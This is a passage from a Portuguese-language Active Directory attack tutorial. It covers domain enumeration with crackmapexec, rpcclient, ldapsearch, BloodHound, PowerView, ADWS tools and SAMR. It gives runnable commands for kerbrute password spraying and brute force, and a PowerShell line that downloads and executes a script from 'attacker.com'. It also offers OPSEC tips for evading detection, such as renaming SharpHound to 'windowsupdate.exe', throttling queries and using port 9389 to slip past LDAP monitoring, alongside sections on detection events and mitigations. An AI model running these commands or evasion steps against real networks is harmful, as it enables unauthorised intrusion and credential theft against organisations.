crackmapexec smb DC01.corp.local -u usuario -p 'Senha123' --sessions

# Usuários logados
crackmapexec smb 192.168.1.0/24 -u usuario -p 'Senha123' --loggedon-users

# Módulo: spider de shares
crackmapexec smb DC01.corp.local -u usuario -p 'Senha123' -M spider_plus

# ================================================================
# rpcclient — enumeração via RPC

rpcclient -U "usuario%Senha123" DC01.corp.local

# Dentro do rpcclient:
enumdomusers              # listar usuários
enumdomgroups             # listar grupos
querydominfo              # info do domínio
getdompwinfo              # política de senha
netshareenum              # shares
queryuser 0x1f4           # info de usuário por RID (0x1f4 = 500 = Administrator)
enumprinters              # impressoras
# Sair: quit

# Não-interativo:
rpcclient -U "usuario%Senha123" DC01.corp.local -c "enumdomusers"
rpcclient -U "usuario%Senha123" DC01.corp.local -c "getdompwinfo"

# ================================================================
# ldapsearch — enumeração LDAP raw

# Info básica (anonymous)
ldapsearch -x -H ldap://DC01.corp.local -b "" -s base "(objectClass=*)"

# Usuários com credenciais
ldapsearch -x -H ldap://DC01.corp.local \
    -D "usuario@corp.local" \
    -w 'Senha123' \
    -b "DC=corp,DC=local" \
    "(objectClass=user)" \
    samaccountname mail memberof pwdlastset userAccountControl

# Exportar tudo
ldapsearch -x -H ldap://DC01.corp.local \
    -D "usuario@corp.local" \
    -w 'Senha123' \
    -b "DC=corp,DC=local" \
    "(objectClass=*)" > /tmp/ldap_full_dump.txt

# ================================================================
# impacket-GetADUsers — listagem rápida de usuários

GetADUsers.py -all \
    -dc-ip 192.168.1.10 \
    corp.local/usuario:Senha123

# ================================================================
# Kerbrute — validação de usuários sem autenticação

# Enumerar usuários válidos
kerbrute userenum \
    --dc DC01.corp.local \
    -d corp.local \
    /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt

# Password spray (cuidado com lockout!)
kerbrute passwordspray \
    --dc DC01.corp.local \
    -d corp.local \
    users.txt \
    'Senha123'

# Bruteforce de usuário específico (após lockout policy verificada)
kerbrute bruteuser \
    --dc DC01.corp.local \
    -d corp.local \
    /usr/share/wordlists/rockyou.txt \
    administrador
```

---

### Workflow de Enumeração Sequencial

```bash
# ================================================================
# FASE 1: Reconhecimento inicial (credenciais em mãos)

# Coleta rápida via ldapdomaindump
ldapdomaindump -u 'corp.local\usuario' -p 'Senha123' DC_IP -o /tmp/ldap_dump/

# Abrir browser para análise rápida
python3 -m http.server 8888 --directory /tmp/ldap_dump/ &
# http://localhost:8888/domain_policy.html — política de senhas
# http://localhost:8888/domain_users.html — usuários
# http://localhost:8888/domain_computers_by_os.html — SOs desatualizados

# ================================================================
# FASE 2: Coleta BloodHound

# DCOnly primeiro (silencioso)
bloodhound-python -u usuario -p 'Senha123' -d corp.local \
    --dc DC_IP -c DCOnly --zip -o /tmp/bh/

# Importar no BloodHound e analisar grafos

# ================================================================
# FASE 3: Análise de alvos via PowerView (se no Windows)

# Na máquina Windows comprometida:
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerView.ps1')

# Verificar posição atual
Get-DomainUser $env:USERNAME | Select-Object memberof
Get-DomainComputer $env:COMPUTERNAME | Select-Object unconstraineddelegation

# Verificar Kerberoastable de alto valor
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,pwdlastset,memberof |
    Where-Object { $_.memberof -match "Domain Admins|Enterprise Admins" }

# Verificar admin local
Find-LocalAdminAccess | ForEach-Object {
    Write-Host "[+] Admin em: $_" -ForegroundColor Green
}

# ================================================================
# FASE 4: Sessões de DA

# Coleta de sessões no BloodHound
bloodhound-python -u usuario -p 'Senha123' -d corp.local \
    --dc DC_IP -c Session --zip -o /tmp/bh_sessions/

# Query no BloodHound:
# "Find Shortest Paths to Domain Admins" — usando sessões como edges

# ================================================================
# FASE 5: Plano de ataque

# Com base nas queries Cypher, identificar:
# 1. Caminho mais curto para DA
# 2. Kerberoastable de alto valor (membros de DA)
# 3. Computadores com UD onde posso capturar TGTs
# 4. ACLs abusáveis sobre objetos de DA
# Priorizar e executar conforme escopo do engagement
```

---

## Detecção e OPSEC

### Como a Coleta do SharpHound é Detectada

**Eventos gerados por DCOnly** (apenas no DC):
```
Event ID 4662 — Leitura de objetos LDAP em volume
Event ID 4624 — Logon do usuário que executa SharpHound (tipo 3 — network)

# Padrão: muitas queries LDAP em sequência rápida
# A coleta de ACLs (ObjectAceType reads) é particularmente barulhenta
```

**Eventos gerados por All** (em cada host visitado):
```
Event ID 4624 — Logon network em cada computador consultado
Event ID 5145 — Network share access (NetSessionEnum usa SRVSVC)
Event ID 4648 — Logon com credenciais explícitas (se usando /LdapUsername)

# Sysmon Event ID 3 — Network connection para porta 445 em todos os hosts
```

### OPSEC — Reduzindo Detecção

```powershell
# RUIM — escanear toda a rede de uma vez com All
SharpHound.exe --CollectionMethods All

# MELHOR — DCOnly primeiro, depois targeted
SharpHound.exe --CollectionMethods DCOnly --RandomizeFilenames

# MELHOR — usar delay entre queries
SharpHound.exe \
    --CollectionMethods All \
    --Jitter 15 \        # 15% de variação no timing
    --Throttle 5000      # 5 segundos entre requests

# Usar nome de processo diferente (renomear SharpHound.exe)
# IDS baseados em nome de processo não detectam
Copy-Item SharpHound.exe windowsupdate.exe
.\windowsupdate.exe --CollectionMethods DCOnly

# Executar em horário de expediente quando tráfego LDAP é normal

# Preferir bloodhound-python de fora do perímetro se VPN/acesso direto ao DC
# (não deixa executável no host Windows)
```

### Mitigações Defensivas

```
1. Monitorar Event 4662 em volume — múltiplas leituras LDAP em sequência
2. Microsoft Advanced Threat Analytics (ATA) / Defender for Identity:
   - Detecta padrão de coleta do BloodHound especificamente
   - Alerta "Reconnaissance using LDAP queries"
   - Alerta "Account enumeration reconnaissance"
3. Habilitar auditoria de acesso a objetos do AD (Object Access Auditing)
4. Limitar NetSessionEnum — patches KB2871997, RestrictRemoteSAM
5. Usar Protected Users Security Group para contas de DA
6. Implementar Credential Guard (previne captura de credentials via LSASS)
7. Tiered Admin Model — DAs nunca logam em workstations
   → Remove sessões de DA de hosts não-privilegiados
   → Bloqueia o edge HasSession no grafo de ataque
```

---

## ADWS — Active Directory Web Services (Porta 9389)

### O Que É

**ADWS (Active Directory Web Services)** é um protocolo de acesso ao AD baseado em SOAP (Web Services for Management — WS-Management) que roda na porta **TCP 9389** em todos os Domain Controllers desde Windows Server 2008 R2.

É a camada de transporte usada por:
- PowerShell AD module (RSAT): `Get-ADUser`, `Get-ADComputer`, `Get-ADGroup`, `Get-ADObject`
- Active Directory Administrative Center (ADAC)
- Microsoft Identity Manager e outros produtos de gerenciamento de identidade

Internamente, ADWS traduz requests SOAP em queries LDAP e retorna os resultados. Do ponto de vista do ataque, ADWS é uma API de enumeração completa do AD.

### Relevância para Atacantes

A maioria das ferramentas de detecção e SIEMs configura alertas em tráfego LDAP (portas 389/636). O ADWS em porta 9389 frequentemente **não está incluído nesse monitoramento**, tornando a enumeração via AD module menos visível que SharpHound ou LDAP direto.

**Pré-requisito**: RSAT AD PowerShell module disponível no host comprometido.

```powershell
# Verificar se AD module está disponível
Get-Module -ListAvailable -Name ActiveDirectory

# Instalar em Windows 10/11 (requer internet ou WSUS)
Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"

# Importar
Import-Module ActiveDirectory
```

### Enumeração via AD Module (ADWS)

```powershell
# Todos os usuários do domínio
Get-ADUser -Filter * -Properties *

# Usuários com SPN (Kerberoasting)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Usuários sem pré-autenticação Kerberos (AS-REP Roasting)
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# Grupos e membros
Get-ADGroup -Filter * | Select Name
Get-ADGroupMember "Domain Admins" -Recursive

# Computadores do domínio
Get-ADComputer -Filter * -Properties OperatingSystem, LastLogonDate |
    Select Name, OperatingSystem, LastLogonDate

# Objetos com delegação configurada
Get-ADComputer -Filter {TrustedForDelegation -eq $true}
Get-ADUser -Filter {TrustedForDelegation -eq $true}

# Contas com senha que não expira
Get-ADUser -Filter {PasswordNeverExpires -eq $true} -Properties PasswordNeverExpires

# Todos os objetos com AdminCount=1 (protegidos pelo AdminSDHolder)
Get-ADUser -LDAPFilter "(admincount=1)"
Get-ADGroup -LDAPFilter "(admincount=1)"

# Fine-grained password policies
Get-ADFineGrainedPasswordPolicy -Filter *
```

### Vantagem sobre LDAP Direto

| Aspecto | LDAP (port 389) | ADWS (port 9389) |
|---------|----------------|-----------------|
| Monitoramento padrão | Sim — Event 4662 | Menos comum |
| Requer credenciais | Não (bind anon desabilitado por padrão no W2019+) | Autenticação Windows |
| Volume de tráfego | Baixo se cirúrgico | Similar |
| Detecção por MDA/Defender for Identity | Sim | Parcial |
| Disponibilidade | Sempre no DC | Requer RSAT no cliente |

### Por Que ADWS Evade Detecção de LDAP

Princípio arquitetural: **PowerShell AD module não gera tráfego LDAP de rede**. Toda query é SOAP/XML sobre TCP 9389; o DC traduz internamente para LDAP local. Consequência:

- Detecções baseadas em **packet capture** em portas 389/636 → cegas a ADWS
- Tráfego ADWS criptografado por padrão (Net.TCP + segurança WCF) → filtros não inspecionam
- Event 1644 (LDAP query log) é gerado pelo NTDS — mas mostra `Client: [::1]` ou `127.0.0.1`, **mascarando o IP real do atacante** (consulta vem da camada ADWS local)
- Obfuscação de comando PowerShell (`geT-aDcompUTER`) é irrelevante pois ADWS converte tudo em LDAP normalizado antes de logar

### Ferramentas Ofensivas Avançadas

**SOAPHound** (FalconForce) — .NET, embute LDAP queries em SOAP direto sem AD module:

```cmd
# Build cache (todos objetos + ACLs)
SOAPHound.exe --buildcache -c C:\temp\cache.txt

# Dump BloodHound JSON (sem coleta de LAPS)
SOAPHound.exe --bhdump -o C:\temp\bh-output --nolaps

# DNS records
SOAPHound.exe --dnsdump -o C:\temp\dns-output

# Execução in-memory via Cobalt Strike
dotnet inline-execute /path/SOAPHound.exe --bhdump -o C:\temp\out --nolaps
```

**SoaPy** — Python equivalente, operação Linux/externa:

```bash
soapy domain/user:'password'@DC_IP --users
soapy domain/user:'password'@DC_IP --query '(objectClass=computer)' \
    --filter "samaccountname,objectsid"
```

**ShadowHound** (Yehuda Smirnov) — PowerShell puro, filtros LDAP custom:

```powershell
ShadowHound-DS -OutputFile "C:\temp\ldap_output.txt"
ShadowHound-DS -OutputFile "C:\temp\comp.txt" -LdapFilter "(objectClass=computer)"
```

Diferencial: nenhuma dessas ferramentas requer RSAT instalado no host.

### Detecção Host-Based (Único Caminho Viável)

Network detection falha. Defensor precisa **correlacionar eventos NTDS Diagnostics** no DC:

| Event | Significado | Campos-chave |
|-------|-------------|--------------|
| 1138 | Conexão ADWS aberta | ClientAddress (IP real), InstanceId |
| 1139 | Autenticação ADWS confirmada | PrincipalName, InstanceId |
| 1644 | Query LDAP traduzida executada | Filter, Attributes, Client=[::1] |
| 1166 | Estatísticas por objeto | InstanceId, TimeElapsed, EntriesReturned |
| 1167 | Sessão ADWS encerrada | InstanceId |

**Chave de correlação**: `InstanceId` (também chamado Operation ID) — único valor que liga 1138/1139 (IP real) com 1644 (filtro/atributos). Sem essa correlação, 1644 sozinho parece atividade interna legítima.

Habilitar Event 1644 (não vem por padrão):

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics" ^
    /v "15 Field Engineering" /t REG_DWORD /d 5 /f
```

Valor 5 = log todos os search queries. Custo: I/O alto em DCs ocupados — defensor ajusta seletivamente.

### Assinaturas PowerShell em Event 1644

Padrões que identificam AD module especificamente:

- **`[all_with_list]`** no campo `Attributes` → indica uso de `-Properties *` (bulk dump). Exclusivo de PowerShell — não aparece em Python LDAP, .NET DirectorySearcher, nem ldapsearch.
- **`SDflags:0x7`** em server controls → request de Security Descriptor completo (Owner+Group+DACL). Assinatura de SharpHound, SOAPHound, ou qualquer enumeração focada em ACL paths para privesc.
- **`Client: [::1]` ou `127.0.0.1`** em Event 1644 → query veio via ADWS (não LDAP de rede). Sempre presente, pois ADWS é cliente local do NTDS.

### Sysmon — Network Connect para 9389

Detecção complementar quando NTDS Diagnostics está desabilitado:

```xml
<RuleGroup name="ADWS" groupRelation="or">
  <NetworkConnect onmatch="include">
    <Rule name="ADWS Connection from Non-Admin Host">
      <DestinationPort condition="is">9389</DestinationPort>
      <Image condition="end with">powershell.exe</Image>
    </Rule>
  </NetworkConnect>
</RuleGroup>
```

Baseline: conexões 9389 são esperadas de admin workstations e Tier-0. Qualquer outro host = anomalia.

### Decoy Accounts (SACL-Based)

Alternativa quando Event 1644 não pode ser habilitado em massa:

- Criar conta honeypot com SACL "Read all properties — Everyone"
- Qualquer enumeração via `Get-ADUser` ou `-Properties *` toca a conta → Event 4662
- Independe de network/ADWS — detecta no objeto-alvo

### Defender for Identity (MDI)

MDI inspeciona LDAP *após* tradução interna no DC → detecta enumeração ADWS:

- "Active Directory enumeration reconnaissance" dispara em `Get-ADUser -Filter *`
- "Account enumeration reconnaissance" — varredura de SAMR + LDAP

Limitação MDI: dependente de sensor instalado no DC + assinaturas atualizadas. Não substitui correlação 1138/1644.

### Teste de Conectividade ADWS

Útil quando LDAP 389/636 bloqueado por firewall mas 9389 acessível:

```powershell
Test-NetConnection -ComputerName DC01 -Port 9389

# Se acessível:
Import-Module ActiveDirectory
Get-ADDomain
```

### Workflow OPSEC Recomendado

```
1. Reconhecer se NTDS Diagnostics está em 0 (default) → 1644 não loga
   reg query "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics" /v "15 Field Engineering"

2. Preferir SOAPHound/SoaPy sobre AD module quando RSAT não instalado
   (evita instalar capability — gera Event 4798 + Setup logs)

3. Evitar -Properties * → gera [all_with_list] em 1644 se habilitado
   Pedir atributos específicos: -Properties samaccountname,memberof,description

4. Spread temporal — não enumerar todos os objetos em uma sessão
   (1166 reporta EntriesReturned alto → anomaly score)

5. Origem da query: jump server / admin workstation, não host de usuário
   (1138 expõe ClientAddress real — host fora do tier-0 é IOC imediato)
```

---

## MS-SAMR — Domain Enumeration via RPC

### Conceito

MS-SAMR (Security Account Manager Remote Protocol) é protocolo RPC sobre SMB (pipe `\SAMR`) que permite consultar usuários, grupos e políticas de domínio. **Alternativa ao LDAP** quando porta 389/636 está bloqueada ou monitorada.

`net user /domain` e `net group /domain` usam MS-SAMR internamente.

### Enumeração Sem LDAP

```powershell
# Enumerate domain users via MS-SAMR (built-in)
net user /domain

# Enumerate domain groups
net group /domain
net group "Domain Admins" /domain

# Enumerate local admins (SAM local)
net localgroup administrators
```

### Via Impacket

```bash
# samrdump — enumera users, groups, password policy
impacket-samrdump DOMAIN/user:pass@dc-ip

# Com hash (PtH)
impacket-samrdump -hashes :NTLMHASH DOMAIN/user@dc-ip

# Output: lista completa de users + RIDs + grupos
```

### Via C — SAMR RPC Calls

Impacket internamente chama:
1. `SamrConnect5` → handle de servidor.
2. `SamrOpenDomain` → handle de domínio.
3. `SamrEnumerateUsersInDomain(DOMAIN_HANDLE, EnumerationContext, UserAccountControl filter)`.
4. `SamrOpenUser` + `SamrQueryInformationUser` → detalhes de cada user.

```c
// Pseudo-flow via WinAPI (Netapi32)
#include <lm.h>
#pragma comment(lib, "netapi32")

void EnumDomainUsers(LPCWSTR pDC) {
    NET_DISPLAY_USER* pBuf = NULL;
    DWORD dwIdx = 0, dwTotal = 0, dwRead = 0;

    while (TRUE) {
        DWORD rc = NetQueryDisplayInformation(pDC, 1, dwIdx, 1000,
                                               MAX_PREFERRED_LENGTH,
                                               &dwRead, (PVOID*)&pBuf);
        for (DWORD i = 0; i < dwRead; i++) {
            wprintf(L"User: %s | Comment: %s\n",
                    pBuf[i].usri1_name, pBuf[i].usri1_comment);
        }
        NetApiBufferFree(pBuf);
        if (rc != ERROR_MORE_DATA) break;
        dwIdx += dwRead;
    }
}
```

### SAMR vs LDAP — Detecção

| Aspecto | LDAP | SAMR |
|---------|------|------|
| Porta | 389/636 | 445 (SMB pipe) |
| Log | Security Event 4662 (LDAP bind) | Security Event 4661 (SAM handle request) |
| IDS | LDAP query volume alerts | Menos monitorado em SMB |
| Anonymou | LDAP anonymous bind (desabilitado por default) | SAMR sem creds = restrito desde KB2965908 |

SAMR é **menos monitorado** na maioria dos ambientes. Útil quando alertas LDAP estão ativos.

### Restrições (KB2965908 / MS16-020)

Desde patch 2016, SAMR sem autenticação (null session) retorna erro em domínios com Windows 2016+. Requer credenciais.

Ambientes com DCs legados (2012R2) ainda permitem SAMR limitado sem auth.

---

## Módulos Relacionados

`02_kerberoasting_e_asrep.md` consome queries BloodHound pra Kerberoastable e AS-REP Roastable. `03_golden_e_silver_tickets.md` usa BH pra identificar service accounts com SPN. `04_dcsync_e_dominancia.md` mostra como o edge DCSync no BH identifica caminhos de replicação. `05_delegacao_unconstrained.md` e `06_delegacao_constrained_e_rbcd.md` consomem queries pra computadores com delegação. `09_dacl_attacks.md` mapeia edges de ACL (GenericAll, WriteDACL) no BH. `10_adcs_attacks.md` cobre CertServices collection e templates vulneráveis via BloodHound CE.

---

## Leitura Complementar

- BloodHound GitHub — https://github.com/SpecterOps/BloodHound
- SharpHound — https://github.com/BloodHoundAD/SharpHound
- bloodhound-python — https://github.com/dirkjanm/BloodHound.py
- PowerView — https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
- ldapdomaindump — https://github.com/dirkjanm/ldapdomaindump
- enum4linux-ng — https://github.com/cddmp/enum4linux-ng
- SpecterOps BloodHound Docs — https://support.bloodhoundenterprise.io/
- harmj0y — "BloodHound 1.0"
- Cypher Query Language Reference — https://neo4j.com/docs/cypher-manual/
